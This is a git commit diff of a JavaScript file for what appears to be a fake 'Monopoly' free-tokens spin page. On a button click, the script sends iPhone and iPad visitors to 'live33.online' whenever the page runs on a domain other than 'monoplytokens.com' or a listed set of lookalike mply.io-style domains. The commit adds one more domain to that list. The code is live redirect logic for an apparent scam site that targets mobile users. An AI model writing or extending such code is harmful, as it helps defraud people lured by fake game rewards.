baf142ea5c1571dd589e6e01a7ff24865e8f5f27
dev20l <iphonetasli@gmail.com>
2025-02-16 15:41:01 +0100

    Update mo.js

--- mo.js
+++ mo.js
@@ -1,12 +1,12 @@
-
- /*================== [ VICTOR ABDO ] ===============*/
- /*================== [ monopoly ] ================*/
+/*================== [ VICTOR ABDO ] ===============*/
+/*================== [ monopoly ] ================*/
 var button = document.querySelector('.spin-buttons');  
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "monoplytokens.com";
         var redirectURL = "https://live33.online/?9fbfb39";
         var blockedDomains = [
+            "jsdhjjhhjjhejkjkas.blogspot.com",
             "mply.io.t0ke2n.site",
             "mply.io.1arshg4.site",
             "mply.io.4a6b8dh.site"
@@ -14,7 +14,8 @@ button.addEventListener('click', function() {
 
         if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
             var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
-            if (isIphoneOrIpad) {
+
+            if (isIphoneOrIpad) { 
                 window.location.href = redirectURL;
             }
         }
